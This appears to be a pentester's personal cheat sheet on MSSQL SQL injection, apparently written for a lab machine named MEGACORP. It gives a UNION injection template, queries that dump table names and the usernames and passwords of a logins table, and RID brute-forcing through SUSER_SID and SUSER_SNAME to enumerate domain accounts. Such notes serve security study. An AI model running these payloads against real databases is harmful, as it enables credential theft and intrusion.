# mssql

##### general queries

union queries

select all union 1, 2, 3, <inject>, 5-- 

```
db_name()																	"current db"
db_name(n)																	"bruteforce db"
user, system_user, current_user												"running as user"
@@version																	"version"
(SELECT STRING_AGG(name,',') FROM Hub_DB..sysobjects WHERE xtype = 'U')		"dump tables"
```

![image-20200922131425094](/home/manish/.config/Typora/typora-user-images/image-20200922131425094.png)



##### dumping information

```
(SELECT STRING_AGG(name,',') FROM Hub_DB..sysobjects WHERE xtype = 'U')		"dumping table"
(SELECT STRING_AGG(username,',') from logins)								"dumping columns"
(SELECT STRING_AGG(password,',') from logins)								"dumping columns"
```



![image-20200922131859662](/home/manish/.config/Typora/typora-user-images/image-20200922131859662.png)





##### brute_rid

````
master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator'))
````

- removing last 4 bytes will give us identifier we can increment rid to get new users
- also note it is in little endian order

![image-20200922132144302](/home/manish/.config/Typora/typora-user-images/image-20200922132144302.png)



```
SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000) 	"finding username from sid"
```

![image-20200922132708871](/home/manish/.config/Typora/typora-user-images/image-20200922132708871.png)



- writing a script

![image-20200922132948150](mssql.assets/image-20200922132948150.png)